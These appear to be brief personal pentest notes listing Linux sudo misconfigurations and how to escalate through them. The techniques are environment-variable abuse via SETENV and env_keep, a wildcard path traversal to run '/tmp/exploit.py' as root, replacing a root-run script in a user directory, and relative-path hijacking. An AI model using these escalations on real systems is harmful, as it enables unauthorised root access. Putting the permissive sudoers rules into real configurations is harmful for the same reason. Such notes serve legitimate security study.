## sudoer file
```
users hosts=(user:group) commands
<username>  ALL=NOPASSWD: ALL
```
## env variable
* testuser ALL=NOPASSWD: /tmp/a.sh
* sudo: sorry, you are not allowed to set the following environment variables: PATH
<!-- * reason: `Defaults        secure_path=...` in the sudoers file -->
* reason `testuser ALL=(root) SETENV:NOPASSWD: /usr/bin/python3 /opt/development/test_module.py ` (no SETENV)

## env variable2
`env_keep += xxx1`

## path traversal
```shell
testuser ALL=(root) SETENV:NOPASSWD: /usr/bin/python3 /opt/development/*.py

exploit:
/usr/bin/python3 /opt/development/../../../tmp/exploit.py
```


## weak permission in user directory
```
sudo -l
/usr/bin/python3 /home/cyber/run.py(owned by root, 700)

exploit: create a new run.py in user directory
```

## relative path
```python
# sudo -l
# /usr/bin/python3 /opt/test.py
...
arg_list = ['./full-checkup.sh']
print(run_command(arg_list))
# the ./ path is on the cwd that the command is executed
```